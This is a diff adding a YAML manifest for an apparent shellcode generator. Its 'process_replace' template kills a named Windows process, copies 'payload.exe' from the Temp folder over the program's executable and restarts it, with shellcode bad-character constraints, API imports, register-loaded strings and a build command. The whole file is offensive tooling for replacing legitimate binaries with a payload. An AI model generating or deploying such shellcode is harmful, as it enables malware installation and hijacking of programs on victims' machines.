@@ -1,0 +1,40 @@
+template: process_replace
+# Kill a running process by name, copy a replacement binary, restart it.
+#
+# Build:
+#   uv run emitter Tools/emitter/manifests/process_replace.yaml \
+#       --process-name "target.exe" \
+#       --src "C:\\Windows\\Temp\\payload.exe" \
+#       --dst "C:\\Program Files\\target\\target.exe" \
+#       --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - CreateToolhelp32Snapshot
+  - Process32First
+  - Process32Next
+  - OpenProcess
+  - TerminateProcess
+  - WaitForSingleObject
+  - CloseHandle
+  - CopyFileA
+  - WinExec
+  - ExitProcess
+
+variables:
+  - snapshot_handle
+  - target_pid
+
+strings:
+  - label: process_name
+    value: "target.exe"
+    method: mov
+    dest: edi
+  - label: src_path
+    value: "C:\\Windows\\Temp\\payload.exe"
+    method: mov
+    dest: edi
+  - label: dst_path
+    value: "C:\\Program Files\\target\\target.exe"
+    method: mov
+    dest: edi
